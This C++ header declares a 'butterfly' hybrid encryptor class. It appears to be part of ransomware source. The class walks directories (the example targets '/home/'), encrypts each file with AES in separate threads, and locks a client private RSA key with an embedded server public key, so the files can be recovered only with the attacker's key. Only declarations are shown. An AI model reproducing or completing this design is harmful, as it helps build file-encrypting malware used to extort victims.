
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include <algorithm>
#include <thread>

#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "directoryIterator.h"
#include "fileExtensions.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
 */
class Encryptor
{

private:
    int _keySize;
    bool _aesKeyInit;
    std::string _aesKeyDBPath;
    std::vector<std::thread> _threads;

    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;

    /**
     * Validates the AESKey/AESIV length after the AESKey generation
     */
    void validateAESKeyLength();

public:
    /**
     * Constructor Encryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
     *       encryptor->invokeDir("/home/");
     *
     * @param keySize: size of the key
     * @param aesKeyDBPath:
     */
    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDBPath = "AES.db");

    /**
     * Destructor Encryptor
     */
    ~Encryptor() = default;

    /**
     * Invokes the provided directory path
     *
     * @param path: path of the directory
     * @param protection: enable/disable protection mode
     */
    void invokeDir(const std::string &dirPath, bool protection);

    /**
     * Encrypts the CPrivateRSA.pem and saves the CPrivateRSA.bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     * Encrypts all files with AES
     *
     * @param filepath: path of the file
     */
    void encryptFileWithAES(const std::string &filepath);

    /**
     * Encrypts the final AES Key and IV with RSA
     *
     * @param aesKeyStr: AES Key or IV String
     * @param filename: name of the encrypted file
     */
    void encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename);

    /**
     * Spawns a new Thread for encrypting the file
     *
     * @param filepath: path to the file
     */
    void spawnThread(const std::string &filepath);

    /**
     * Joins the threads in the thread vector
     */
    void joinThreads();
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
